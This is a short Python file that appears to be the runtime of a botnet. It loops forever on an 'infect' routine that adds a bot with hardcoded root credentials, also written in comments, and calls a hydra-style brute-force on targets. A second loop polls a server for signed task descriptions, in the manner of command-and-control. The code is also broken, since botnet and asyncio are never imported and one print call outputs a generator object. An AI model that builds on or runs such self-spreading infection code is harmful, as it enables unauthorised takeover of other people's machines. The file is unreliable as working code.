import settings

class BotRunTime:
    def __init__(self, loop, server):
        self.loop = loop
        self.server = server
        loop.create_task(self.infect())
        loop.create_task(self.get_and_schedule_job())
        self.run()
#host ip:10.142.0.2  
#host username:root
#host password:password
    async def infect(self):
        while True:
            print('infect')
            botnet.add_bot('10.142.0.2','root','password')
            target = botnet.targets()
            botnet.hydra(target)
            print(i.host for i in botnet)
            await asyncio.sleep(settings.INFECTION_CYCLE_TIME)

    async def get_and_schedule_job(self):
        while True:
            signed_task_description = self.server.get('task')
            print(signed_task_description)
            await asyncio.sleep(settings.GET_JOB_CYCLE_TIME)

    def run(self):
        try:
            self.loop.run_forever()
        except KeyboardInterrupt:
            pass
        finally:
            self.server.stop()
            self.loop.close()
